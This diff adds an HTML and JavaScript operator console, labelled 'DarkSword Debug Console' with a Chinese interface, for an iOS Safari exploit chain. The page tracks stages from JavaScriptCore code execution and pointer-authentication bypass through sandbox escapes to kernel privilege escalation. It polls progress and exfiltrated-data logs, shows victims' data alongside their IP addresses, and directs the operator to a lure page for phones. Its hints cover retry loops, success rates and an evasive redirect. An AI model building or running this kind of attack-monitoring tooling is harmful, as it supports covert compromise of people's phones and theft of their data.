@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Debug Console · DarkSword</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: #0e1116; color: #c9d1d9;
+         font: 13px/1.55 ui-monospace, Consolas, "Courier New", monospace; }
+  header { position: sticky; top: 0; z-index: 10; background: #161b22;
+           border-bottom: 1px solid #30363d; padding: 12px 14px; }
+  h1 { margin: 0 0 8px; font-size: 14px; color: #e6edf3; font-weight: 600; }
+  .row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; font-size: 12px; }
+  .k { color: #8b949e; } .v { color: #e6edf3; font-weight: 600; }
+  .badge { padding: 2px 9px; border-radius: 999px; font-weight: 700; font-size: 11px; }
+  .b-run  { background:#1f6feb33; color:#79c0ff; border:1px solid #1f6feb; }
+  .b-wait { background:#9e6a0333; color:#e3b341; border:1px solid #9e6a03; }
+  .b-stuck{ background:#f8514933; color:#ff7b72; border:1px solid #f85149; }
+  .b-done { background:#23863633; color:#7ee787; border:1px solid #238636; }
+  .b-idle { background:#21262d; color:#8b949e; border:1px solid #30363d; }
+  .btn { background:#21262d; color:#c9d1d9; border:1px solid #30363d; border-radius:6px;
+         padding:4px 10px; font-size:12px; cursor:pointer; font-family:inherit; }
+  .btn:hover { background:#30363d; }
+  .btn-danger { color:#f85149; }
+
+  .tabs { display:flex; gap:2px; margin:10px 0 0; }
+  .tab { padding:5px 14px; background:#0d1117; border:1px solid #30363d; border-bottom:0;
+         border-radius:6px 6px 0 0; cursor:pointer; font-size:12px; color:#8b949e; }
+  .tab.on { background:#161b22; color:#e6edf3; font-weight:600; }
+  .tab .n { color:#79c0ff; }
+
+  .sync { margin: 9px 0 0; padding: 7px 11px; border-radius: 7px; font-size: 12px;
+          background:#0d2818; border:1px solid #238636; color:#7ee787;
+          display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
+  .sync .dot { width:7px; height:7px; border-radius:50%; background:#3fb950;
+               box-shadow:0 0 6px #3fb950; flex:none; }
+  .sync code { background:#161b22; border:1px solid #30363d; border-radius:4px;
+               padding:1px 6px; font-size:11.5px; color:#79c0ff; }
+
+  .bar { margin:10px 0 0; height:5px; background:#21262d; border-radius:3px;
+         overflow:hidden; display:flex; gap:2px; }
+  .seg { flex:1; background:#30363d; }
+  .seg.on { background:#3fb950; } .seg.cur { background:#e3b341; }
+  .phases { display:flex; gap:2px; margin:3px 0 0; font-size:9.5px;
+            color:#8b949e; text-align:center; }
+  .phases div { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .phases div.cur { color:#e3b341; } .phases div.on { color:#3fb950; }
+
+  main { padding: 0 14px 40px; }
+  .now { margin:10px 0 0; padding:10px 12px; border-radius:8px;
+         background:#161b22; border:1px solid #30363d; }
+  .now .lbl { color:#8b949e; font-size:11px; letter-spacing:.04em; }
+  .now .val { color:#e6edf3; font-size:14px; font-weight:600; margin-top:3px; word-break:break-all; }
+
+  .warn { margin:10px 0 0; padding:9px 12px; border-radius:8px; font-size:12px;
+          background:#f8514922; border:1px solid #f8514966; color:#ff7b72; }
+  .info { margin:10px 0 0; padding:9px 12px; border-radius:8px; font-size:12px;
+          background:#9e6a0322; border:1px solid #9e6a0366; color:#e3b341; }
+  .ok   { margin:10px 0 0; padding:9px 12px; border-radius:8px; font-size:12px;
+          background:#23863622; border:1px solid #23863666; color:#7ee787; }
+
+  table { width:100%; border-collapse:collapse; margin-top:12px; font-size:12px; }
+  th, td { padding:5px 10px; text-align:left; border-bottom:1px solid #21262d; vertical-align:top; }
+  th { color:#8b949e; font-weight:600; background:#0e1116; position:sticky; top:0; }
+  td.t { color:#8b949e; white-space:nowrap; width:1%; }
+  td.n { color:#8b949e; white-space:nowrap; width:1%; }
+  td.m { white-space:nowrap; width:1%; }
+  tr.phase-head td { background:#161b22; color:#79c0ff; font-weight:700;
+                     font-size:11.5px; letter-spacing:.03em; }
+  .mth { display:inline-block; min-width:48px; padding:1px 7px; border-radius:5px;
+         font-weight:700; font-size:11px; text-align:center; color:#0d1117; }
+  .empty { padding:30px; color:#8b949e; text-align:center; }
+  pre { margin:6px 0 0; padding:8px 10px; background:#161b22; border:1px solid #21262d;
+        border-radius:6px; font-size:11.5px; white-space:pre-wrap; word-break:break-all;
+        max-height:260px; overflow:auto; }
+  .hint { color:#8b949e; font-size:11.5px; margin-top:6px; }
+  .hint a { color:#58a6ff; }
+  .runbar { display:flex; align-items:center; gap:9px; margin-top:10px; font-size:12px; }
+  .runbar select { background:#0d1117; color:#c9d1d9; border:1px solid #30363d;
+                   border-radius:6px; padding:4px 8px; font-size:12px; font-family:inherit; }
+  .runmeta { color:#8b949e; font-size:11.5px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>DarkSword Debug Console</h1>
+  <div class="row">
+    <span class="badge b-idle" id="st-status">等待中</span>
+    <span><span class="k">步骤</span> <span class="v" id="st-count">0</span></span>
+    <span><span class="k">上报</span> <span class="v" id="st-exfil">0</span></span>
+    <span><span class="k">耗时</span> <span class="v" id="st-elapsed">—</span></span>
+    <span><span class="k">停滞</span> <span class="v" id="st-stall">—</span></span>
+    <span style="flex:1"></span>
+    <button class="btn" id="btn-poll">暂停轮询</button>
+    <button class="btn btn-danger" id="btn-clear">清空进度</button>
+  </div>
+
+  <div class="sync">
+    <span class="dot"></span>
+    <span>本页自动监听 · 受害者请用诱饵页</span>
+    <code>/assets/index.html</code>
+    <span>· 进度 <code>/log.json</code> · 上报 <code>/exfil.json</code></span>
+  </div>
+
+  <div class="tabs">
+    <div class="tab on" data-tab="progress">执行进度 <span class="n" id="tab-n-prog">0</span></div>
+    <div class="tab" data-tab="exfil">上报数据 <span class="n" id="tab-n-exf">0</span></div>
+  </div>
+
+  <div class="runbar">
+    <span class="k">运行轮次</span>
+    <select id="run-sel"></select>
+    <span class="runmeta" id="run-meta"></span>
+  </div>
+</header>
+
+<main>
+  <section id="view-progress">
+    <div class="bar" id="bar"></div>
+    <div class="phases" id="phases"></div>
+    <div class="now">
+      <div class="lbl">当前步骤</div>
+      <div class="val" id="now-val">—</div>
+    </div>
+    <div id="msg"></div>
+    <table>
+      <thead><tr><th>时间</th><th>#</th><th>步骤</th></tr></thead>
+      <tbody id="rows"><tr><td colspan="3" class="empty">暂无进度 — 等待 payload 上报</td></tr></tbody>
+    </table>
+  </section>
+
+  <section id="view-exfil" hidden>
+    <div id="exf-msg"></div>
+    <table>
+      <thead><tr><th>方法</th><th>路径</th><th>来源 IP</th><th>时间</th><th>大小</th></tr></thead>
+      <tbody id="exf-rows"><tr><td colspan="5" class="empty">暂无上报数据</td></tr></tbody>
+    </table>
+  </section>
+</main>
+
+<script>
+(function () {
+  var PHASES = [
+    { name:'JSC RCE', re:/inside stage1|Finished prims|^vm:|^heap:|isSafeToCollect|^after write|RCE success|Failed RCE/ },
+    { name:'对象/上下文定位', re:/^contexts|^defaultLoader|^wrappedBitmap|^imageBuffer|^slide:/ },
+    { name:'dyld / 框架加载', re:/TextToSpeech|NSBundleTables|loadedFrameworks|^bundle\[/ },
+    { name:'RCE stage2 / 线程', re:/Inside stage2|^worker:|^butterfly|Finished stage2|worker\.thread|stack_bottom|stack_top/ },
+    { name:'PAC 绕过 / fcall', re:/^paciza_|^pacib_|gadget_|fcall thread|jop_stack|^x19:|^x22:|^x20:|^stack:|^index:|search_result|^loader:|metadata_data_ptr|InterposeTuple|succeeded to load|going to load|check_dlopen/ },
+    { name:'沙箱逃逸 sbx0', re:/sbx0:|sbx0_main|sandbox0/ },
+    { name:'沙箱逃逸 sbx1', re:/sbx1|sandbox1/i },
+    { name:'内核提权 / 上报', re:/pe_main|kernel|exfil|upload|stats/i },
+  ];
+  // 已知的"阶段正常终点"——这些不是卡住，是当前阶段收尾
+  var TERMINAL = /all done|^RCE success\b/;
+
+  var $ = function (id) { return document.getElementById(id); };
+  var entries = [], exfils = [], lastGrowth = Date.now(), lastCount = -1, polling = true;
+
+  function parseMs(t) { var m = /^\[\s*(\d+)ms\]/.exec(t); return m ? +m[1] : null; }
+  function clean(t) { return t.replace(/^\[\s*\d+ms\]\s*/, ''); }
+  function phaseOf(text) {
+    var s = clean(text);
+    for (var i = 0; i < PHASES.length; i++) if (PHASES[i].re.test(s)) return i;
+    return -1;
+  }
+  function esc(s) {
+    return String(s).replace(/[&<>"]/g, function (c) {
+      return { '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;' }[c]; });
+  }
+  function setStatus(cls, txt) { $('st-status').className = 'badge ' + cls; $('st-status').textContent = txt; }
+
+  // ── 把 entries 切成"运行轮次" ────────────────────────────────────
+  // 分界依据：相邻采集时间间隔 > 5s 视为新一轮（用户重新加载页面）。
+  // 实测数据：轮内相邻条目的间隔几乎都 <3s（重试是背靠背跑的），
+  // 而"加载 → 失败 → 用户重载"之间必然 >5s。故 5s 是可靠的切分点。
+  // 不能用 id 重置切分 —— 页面侧与 worker 侧各有一套 logEntryID 和 logStart，
+  // 两股流交错写入同一日志，id 会频繁回退，按 id 切会把一轮切碎（实测碎成 73 段）。
+  var runs = [], runSelIdx = -1, userPinned = false;
+  var RUN_GAP_MS = 5000;
+
+  function buildRuns() {
+    runs = [];
+    if (!entries.length) return;
+    var cur = [], prevT = null;
+    for (var i = 0; i < entries.length; i++) {
+      var e = entries[i];
+      var t = e.t ? Date.parse(e.t) : null;
+      if (cur.length && prevT != null && t != null && (t - prevT) > RUN_GAP_MS) {
+        runs.push(cur); cur = [];
+      }
+      cur.push(e);
+      if (t != null) prevT = t;
+    }
+    if (cur.length) runs.push(cur);
+  }
+  function runSummary(run) {
+    var hasAllDone = false, hasSbx0 = false, fails = 0, maxAttempt = 0, success = false;
+    for (var i = 0; i < run.length; i++) {
+      var s = clean(run[i].text);
+      if (/all done/.test(s)) hasAllDone = true;
+      if (/^sbx0/.test(s)) hasSbx0 = true;
+      if (/Failed RCE/.test(s)) fails++;
+      if (/RCE success/.test(s)) success = true;
+      // 尝试次数：取该轮内出现过的最大 attempt 编号（rce_module 每次重试都会自增）
+      var m = /check_attempt|attempt\s*(\d+)/i.exec(s);
+      if (m && m[1]) { var n = parseInt(m[1], 10); if (n > maxAttempt) maxAttempt = n; }
+      // DIAG 每条对应一次尝试
+      if (/^DIAG no-oob-array/.test(s)) maxAttempt = Math.max(maxAttempt, 0) + 0;
+    }
+    // 用"失败次数"作为尝试次数的下界（每条 DIAG/Failed 组合对应一次失败尝试）
+    var attempts = Math.max(maxAttempt, fails);
+    var tail = success ? 'RCE success' : (hasAllDone ? 'all done' : (fails ? 'Failed RCE' : '未完成'));
+    return '尝试' + attempts + '次 · 失败' + fails + '次 · ' +
+           (hasSbx0 ? '进入sbx0 · ' : '') + '终点:' + tail;
+  }
+  function fillRunSel() {
+    var sel = $('run-sel');
+    // 重建选项（保留当前选中值，由下面决定是否跟随最新）
+    var prevVal = sel.value;
+    sel.innerHTML = '';
+    for (var i = 0; i < runs.length; i++) {
+      var o = document.createElement('option');
+      o.value = i;
+      var t0 = runs[i][0].t ? runs[i][0].t.slice(11, 19) : '';
+      o.textContent = '第 ' + (i + 1) + ' 轮  (' + t0 + ' · ' + runs[i].length + ' 步)';
+      sel.appendChild(o);
+    }
+    // 仅当用户【手动】选过历史轮次时才锁定；否则始终跟随最新一轮。
+    // （之前只要 prev 合法就保持不变，导致新轮次到达后面板仍判定旧轮次）
+    var want;
+    if (userPinned && prevVal !== '' && +prevVal < runs.length) {
+      want = String(prevVal);
+    } else {
+      want = String(runs.length - 1);
+      userPinned = false;
+    }
+    sel.value = want;
+    runSelIdx = parseInt(want, 10);
+    $('run-meta').textContent = runs.length ? runSummary(runs[runSelIdx]) : '';
+  }
+  function visibleEntries() {
+    if (!runs.length) return entries;
+    if (runSelIdx < 0 || runSelIdx >= runs.length) runSelIdx = runs.length - 1;
+    return runs[runSelIdx];
+  }
+
+  function buildBar() {
+    var ve = visibleEntries();
+    var reached = -1;
+    ve.forEach(function (e) { var p = phaseOf(e.text); if (p > reached) reached = p; });
+    var b = $('bar'), ph = $('phases');
+    b.innerHTML = ''; ph.innerHTML = '';
+    for (var i = 0; i < PHASES.length; i++) {
+      var s = document.createElement('div');
+      s.className = 'seg' + (i < reached ? ' on' : (i === reached ? ' cur' : ''));
+      b.appendChild(s);
+      var d = document.createElement('div');
+      d.textContent = PHASES[i].name;
+      d.className = (i < reached ? 'on' : (i === reached ? 'cur' : ''));
+      ph.appendChild(d);
+    }
+  }
+
+  function renderProgress() {
+    $('st-count').textContent = entries.length;
+    $('tab-n-prog').textContent = entries.length;
+    if (!entries.length) {
+      $('rows').innerHTML = '<tr><td colspan="3" class="empty">暂无进度 — 等待 payload 上报</td></tr>';
+      $('now-val').textContent = '—';
+      return;
+    }
+    var ve = visibleEntries();
+    var last = ve[ve.length - 1];
+    $('now-val').textContent = clean(last.text);
+    var ms = parseMs(last.text);
+    $('st-elapsed').textContent = ms != null ? (ms / 1000).toFixed(1) + 's' : '—';
+
+    var html = '', prev = null;
+    for (var i = 0; i < ve.length; i++) {
+      var e = ve[i], p = phaseOf(e.text);
+      if (p !== -1 && p !== prev) {
+        html += '<tr class="phase-head"><td colspan="3">▸ ' + PHASES[p].name + '</td></tr>';
+        prev = p;
+      }
+      var t = parseMs(e.text);
+      html += '<tr><td class="t">' + (t != null ? (t / 1000).toFixed(2) + 's' : '') + '</td>' +
+              '<td class="n">' + (e.id != null ? e.id : i) + '</td>' +
+              '<td>' + esc(clean(e.text)) + '</td></tr>';
+    }
+    $('rows').innerHTML = html;
+    buildBar();
+  }
+
+  function renderExfil() {
+    $('st-exfil').textContent = exfils.length;
+    $('tab-n-exf').textContent = exfils.length;
+    if (!exfils.length) {
+      $('exf-rows').innerHTML = '<tr><td colspan="5" class="empty">暂无上报数据</td></tr>';
+      return;
+    }
+    var colors = { GET:'#3fb950', POST:'#388bfd', PUT:'#d29922', DELETE:'#f85149' };
+    var html = '';
+    for (var i = exfils.length - 1; i >= 0; i--) {
+      var r = exfils[i], m = (r.method || '').toUpperCase();
+      var body = r.raw_body || '';
+      html += '<tr><td class="m"><span class="mth" style="background:' + (colors[m] || '#8b949e') + '">' +
+              esc(m) + '</span></td>' +
+              '<td>' + esc(r.path || '') +
+              (body ? '<pre>' + esc(body.slice(0, 600)) + '</pre>' : '') + '</td>' +
+              '<td>' + esc(r.ip || '') + '</td>' +
+              '<td class="t">' + esc(r.time || '') + '</td>' +
+              '<td class="t">' + (r.content_length || 0) + 'B</td></tr>';
+    }
+    $('exf-rows').innerHTML = html;
+  }
+
+  function diagnose() {
+    var idle = (Date.now() - lastGrowth) / 1000;
+    $('st-stall').textContent = entries.length ? idle.toFixed(1) + 's' : '—';
+    var msg = $('msg');
+    if (exfils.length) {
+      setStatus('b-done', '已上报');
+      msg.innerHTML = '<div class="ok">✓ 收到 ' + exfils.length + ' 条上报数据，切到「上报数据」标签查看。</div>';
+      return;
+    }
+    if (!entries.length) {
+      setStatus('b-idle', '等待中');
+      msg.innerHTML = '<div class="hint">尚无进度。用<b>手机</b>打开诱饵页触发：' +
+        '<a href="/assets/index.html">/assets/index.html</a>（需 iOS Safari）。</div>';
+      return;
+    }
+    var ve = visibleEntries();
+    var lastStep = ve.length ? clean(ve[ve.length - 1].text) : '';
+
+    // 统计本轮：失败次数、是否已进入 sbx0
+    // 注意：不能用 "inside stage1" 计尝试次数 —— 每条 Failed RCE 对应一次失败尝试，
+    // 而 inside stage1 只在"重试链彻底放弃后的下一次页面加载"才出现，会漏计。
+    var fails = 0, sawSbx0 = false, sawSuccess = false;
+    for (var i = 0; i < ve.length; i++) {
+      var s = clean(ve[i].text);
+      if (/Failed RCE/.test(s)) fails++;
+      if (/^sbx0/.test(s)) sawSbx0 = true;
+      if (/RCE success/.test(s)) sawSuccess = true;
+    }
+    var retries = fails;   // 该轮已发生的失败尝试次数（每次失败即一次尝试）
+
+    // 已知终点：不是卡住，是当前阶段正常收尾
+    if (TERMINAL.test(lastStep)) {
+      setStatus('b-wait', '阶段完成');
+      msg.innerHTML = '<div class="info">' +
+        (/all done/.test(lastStep)
+          ? '✓ <b>JSC RCE + PAC 绕过已完成</b>（all done）。这是当前阶段的正常终点，<b>不是卡住</b>。<br>' +
+            '本轮 JSC 重试 ' + retries + ' 次、失败 ' + fails + ' 次——<b>重试属正常</b>（JSC 利用不稳定）。<br>' +
+            '页面已跳 404.html（规避动作）。下一阶段是 <b>sbx0 沙箱逃逸</b>，其输出已桥接为 <code>sbx0: ...</code>。' +
+            (sawSbx0 ? '本轮已看到 sbx0 输出。' : '若始终没有 <code>sbx0: [ENTRY]</code>，说明 sbx0 未启动。')
+          : '✓ 本轮正常完成：<b>' + esc(lastStep) + '</b>') +
+        '</div>';
+      return;
+    }
+
+    // 本轮失败且已停止 → 明确的失败判定（不是"卡住"）
+    if (fails > 0 && !sawSuccess && idle > 20) {
+      setStatus('b-stuck', 'RCE 未成功');
+      msg.innerHTML = '<div class="warn">⚠️ 本轮 JSC 尝试 <b>' + retries + '</b> 次全部失败（Failed RCE），已停止。<br>' +
+        '最后一轮诊断：<b>' + esc(lastStep) + '</b><br>' +
+        '<div style="margin-top:8px">' +
+        '<b>重试机制</b>：<code>rce_loader.js</code> <b>循环重试 20 次</b>' +
+        '（<code>RCE_MAX_ATTEMPTS</code>），单页通过率约 93%；' +
+        '若 20 次仍全失败，会<b>自动重载页面</b>继续（上限 50 轮，' +
+        '计数存于 <code>sessionStorage</code>），无需手动刷新。' +
+        '</div>' +
+        (retries >= 3
+          ? '<div style="margin-top:6px">已试 ' + retries + ' 次仍失败，属偏低的成功率，继续重载页面即可。</div>'
+          : '<div style="margin-top:6px">建议重新加载页面继续重试。</div>') +
+        '</div>';
+      return;
+    }
+
+    if (idle > 20) {
+      setStatus('b-stuck', '疑似卡住');
+      msg.innerHTML = '<div class="warn">⚠️ 已 ' + idle.toFixed(0) +
+        ' 秒无新步骤，停在：<b>' + esc(lastStep) + '</b><br>' +
+        '排查顺序：① 该步之后的机型/固件偏移是否匹配；② dlopen/fcall 是否被拦；' +
+        '③ 若涉及 sbx0，看是否有 <code>sbx0: ...</code> 行及其中报错。</div>';
+    } else if (idle > 6) {
+      setStatus('b-wait', '进行中');
+      msg.innerHTML = '';
+    } else {
+      setStatus('b-run', '执行中');
+      msg.innerHTML = '';
+    }
+  }
+
+  function poll() {
+    if (!polling) return;
+    Promise.all([
+      fetch('/log.json?_=' + Date.now(), { cache:'no-store' }).then(function (r) { return r.json(); }).catch(function () { return null; }),
+      fetch('/exfil.json?_=' + Date.now(), { cache:'no-store' }).then(function (r) { return r.json(); }).catch(function () { return null; })
+    ]).then(function (res) {
+      var lj = res[0], ej = res[1];
+      if (lj && lj.entries) {
+        if (lj.entries.length !== lastCount) {
+          if (lj.entries.length > lastCount) lastGrowth = Date.now();
+          lastCount = lj.entries.length;
+          entries = lj.entries;
+          buildRuns();
+          fillRunSel();
+          renderProgress();
+        }
+      }
+      if (ej && ej.entries) {
+        if (ej.entries.length !== exfils.length) { exfils = ej.entries; renderExfil(); }
+      }
+      diagnose();
+    });
+  }
+
+  // tabs
+  Array.prototype.forEach.call(document.querySelectorAll('.tab'), function (t) {
+    t.addEventListener('click', function () {
+      Array.prototype.forEach.call(document.querySelectorAll('.tab'), function (x) { x.classList.remove('on'); });
+      t.classList.add('on');
+      var which = t.getAttribute('data-tab');
+      $('view-progress').hidden = which !== 'progress';
+      $('view-exfil').hidden = which !== 'exfil';
+    });
+  });
+
+  $('btn-poll').addEventListener('click', function () {
+    polling = !polling;
+    this.textContent = polling ? '暂停轮询' : '继续轮询';
+    if (polling) poll();
+  });
+  $('btn-clear').addEventListener('click', function () {
+    if (!confirm('清空进度日志？（不影响上报数据）')) return;
+    fetch('/log.json?reset=1', { cache:'no-store' }).then(function () {
+      entries = []; lastCount = -1; lastGrowth = Date.now();
+      runs = []; runSelIdx = -1;
+      $('msg').innerHTML = ''; fillRunSel(); renderProgress(); diagnose();
+    });
+  });
+
+  // 切换运行轮次
+  $('run-sel').addEventListener('change', function () {
+    userPinned = true;               // 用户手动选过历史轮次 -> 之后不再自动跟随最新
+    runSelIdx = parseInt(this.value, 10);
+    $('run-meta').textContent = runs[runSelIdx] ? runSummary(runs[runSelIdx]) : '';
+    renderProgress();
+    diagnose();
+  });
+
+  buildRuns(); fillRunSel(); renderProgress(); renderExfil(); diagnose(); poll();
+  setInterval(poll, 1000);
+})();
+</script>
+</body>
+</html>
